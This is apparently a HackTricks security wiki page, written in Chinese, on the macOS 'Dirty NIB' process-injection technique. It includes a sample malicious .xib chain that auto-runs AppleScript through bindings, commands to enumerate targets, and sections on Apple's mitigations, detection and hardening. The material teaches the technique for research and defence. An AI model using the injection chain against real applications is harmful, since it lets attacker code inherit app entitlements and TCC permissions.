# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB 指的是滥用已签名 macOS app bundle 中的 Interface Builder 文件（.xib/.nib），在目标进程中执行攻击者控制的逻辑，从而继承该进程的 entitlements 和 TCC permissions。该技术最初由 xpn（MDSec）记录，之后由 Sector7 进行了泛化和大幅扩展；Sector7 还介绍了 Apple 在 macOS 13 Ventura 和 macOS 14 Sonoma 中采取的缓解措施。<sup>[1][2]</sup>有关背景和深入分析，请参阅末尾的 references。

> TL;DR
> • macOS 13 Ventura 之前：替换 bundle 的 MainMenu.nib（或其他在启动时加载的 nib）通常可以可靠地实现 process injection，并且经常实现 privilege escalation。
> • 自 macOS 13（Ventura）起，并在 macOS 14（Sonoma）中得到改进：首次启动时的深度验证、bundle protection、Launch Constraints，以及新的 TCC “App Management” permission，基本上阻止了无关 app 在启动后篡改 nib。某些特殊情况下攻击仍可能可行（例如，同一 developer 的 tooling 修改其自有 app，或用户授予 terminal App Management/Full Disk Access 的情况）。


## What are NIB/XIB files

Nib（NeXT Interface Builder 的缩写）文件是 AppKit app 使用的序列化 UI object graphs。现代 Xcode 会保存可编辑的 XML .xib 文件，并在 build 时将其编译为 .nib。典型的 app 通过 `NSApplicationMain()` 加载其 main UI；该函数会从 app 的 Info.plist 中读取 `NSMainNibFile` key，并在运行时实例化 object graph。

支持该攻击的关键点：
- NIB loading 可以实例化任意 Objective-C classes，而不要求这些 classes 遵循 NSSecureCoding（当 `initWithCoder:` 不可用时，Apple 的 nib loader 会回退到 `init`/`initWithFrame:`）。
- Cocoa Bindings 可被滥用于在 nib 实例化时调用 methods，包括不需要用户交互的 chained calls。


## Dirty NIB injection process (attacker view)

经典的 Ventura 之前流程：
1) 创建 malicious .xib
- 添加一个 `NSAppleScript` object（或其他 “gadget” classes，例如 `NSTask`）。
- 添加一个 `NSTextField`，其 title 包含 payload（例如 AppleScript 或 command arguments）。
- 添加一个或多个 `NSMenuItem` objects，通过 bindings 连接到 target object 上的 methods。

2) Auto-trigger without user clicks
- 使用 bindings 设置 menu item 的 target/selector，然后调用 private `_corePerformAction` method，使 action 在 nib 加载时自动触发。这样就不需要用户点击 button。

以下是 .xib 内部 auto-trigger chain 的最小示例（为便于说明进行了删减）：
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
这会在 nib 加载时，让目标进程执行任意 AppleScript。<sup>[1]</sup> 高级利用链可以：
- 实例化任意 AppKit 类（例如 `NSTask`），并调用零参数方法，例如 `-launch`。
- 通过上述 binding 技巧，使用对象参数调用任意 selector。
- 加载 AppleScriptObjC.framework，以桥接到 Objective-C，甚至调用选定的 C API。
- 在仍包含 Python.framework 的旧系统上，桥接到 Python，然后使用 `ctypes` 调用任意 C 函数（Sector7 的研究）。<sup>[2]</sup>

3) 替换应用的 nib
- 将 target.app 复制到可写位置，把例如 `Contents/Resources/MainMenu.nib` 替换为恶意 nib，然后运行 target.app。在 Ventura 之前，经过一次性 Gatekeeper 评估后，后续启动只执行浅层签名检查，因此不会重新验证非可执行资源（例如 .nib）。

用于可见测试的示例 AppleScript payload：
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## 现代 macOS protections（Ventura/Monterey/Sonoma/Sequoia）

Apple 引入了多项系统级 mitigation，大幅降低了 Dirty NIB 在现代 macOS 中的可行性：<sup>[2]</sup>
- 首次启动深度验证和 bundle protection（macOS 13 Ventura）
- 任何 app 首次运行时（无论是否 quarantined），深度 signature check 都会覆盖所有 bundle resources。此后，bundle 会受到保护：只有来自同一 developer 的 app（或经 app 明确允许的 app）才能修改其内容。其他 app 需要新的 TCC “App Management” permission，才能写入另一个 app 的 bundle。
- Launch Constraints（macOS 13 Ventura）
- System/Apple-bundled apps 不能被复制到其他位置并启动；这会阻止“复制到 `/tmp`、patch、运行”这一针对 OS apps 的方法。
- macOS 14 Sonoma 中的改进
- Apple 加固了 App Management，并修复了已知的 bypasses（例如 Sector7 指出的 CVE‑2023‑40450）。Python.framework 更早已被移除（macOS 12.3），导致部分 privilege-escalation chains 失效。
- Gatekeeper/Quarantine changes
- 关于影响该 technique 的 Gatekeeper、provenance 和 assessment changes 的更广泛讨论，请参阅下方引用的页面。

> 实际影响
> • 在 Ventura+ 上，通常无法修改第三方 app 的 `.nib`，除非你的 process 拥有 App Management，或由与目标 app 相同的 Team ID 签名（例如 developer tooling）。
> • 向 shells/terminals 授予 App Management 或 Full Disk Access，实际上会为任何能够在该 terminal context 中执行 code 的对象重新打开这一 attack surface。


### 处理 Launch Constraints

从 Ventura 开始，Launch Constraints 会阻止许多 Apple apps 从非默认位置运行。如果你依赖 Ventura 之前的 workflow，例如将 Apple app 复制到临时目录、修改 `MainMenu.nib` 并启动它，那么预计在 >= 13.0 上会失败。


## 枚举 targets 和 nibs（适用于 research / legacy systems）

- 定位 UI 由 nib 驱动的 apps：
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- 在 bundle 中查找候选 nib 资源：
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- 深入验证代码签名（如果你篡改了资源但没有重新签名，将会失败）：
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> 注意：在现代 macOS 上，尝试在没有适当授权的情况下写入其他应用的 bundle 时，还会受到 bundle protection/TCC 的阻止。


## Detection 和 DFIR 提示

- 对 bundle 资源进行文件完整性监控
- 监视已安装应用中 `Contents/Resources/*.nib` 以及其他非可执行资源的 mtime/ctime 变化。
- Unified logs 和进程行为
- 监控 GUI 应用中是否有意外的 AppleScript 执行，以及进程是否加载 AppleScriptObjC 或 Python.framework。例如：
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- 主动评估
- 定期对关键应用运行 `codesign --verify --deep`，确保资源保持完整。
- 权限上下文
- 审计哪些用户或进程拥有 TCC 的 “App Management” 或 Full Disk Access（尤其是终端和管理 agent）。从通用 shell 中移除这些权限，可以防止轻易重新启用 Dirty NIB 风格的篡改。


## Defensive hardening（开发者和防御人员）

- 优先使用 programmatic UI，或限制从 nibs 实例化的内容。避免在 nib 图中包含强大类（例如 `NSTask`），并避免使用会间接调用任意对象 selector 的 bindings。
- 采用带有 Library Validation 的 hardened runtime（现代应用已普遍如此）。虽然这本身无法阻止 nib injection，但它会阻止简单的 native code 加载，并迫使攻击者使用仅限 scripting 的 payload。
- 不要在通用工具中请求或依赖广泛的 App Management 权限。如果 MDM 需要 App Management，应将该上下文与用户驱动的 shell 隔离。
- 定期验证应用 bundle 的完整性，并使更新机制能够自动修复 bundle 资源。


## HackTricks 中的相关阅读

进一步了解会影响该技术的 Gatekeeper、quarantine 和 provenance 变化：

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB（包含 Pages 示例的原始 write-up）](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files（April 5, 2024）](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
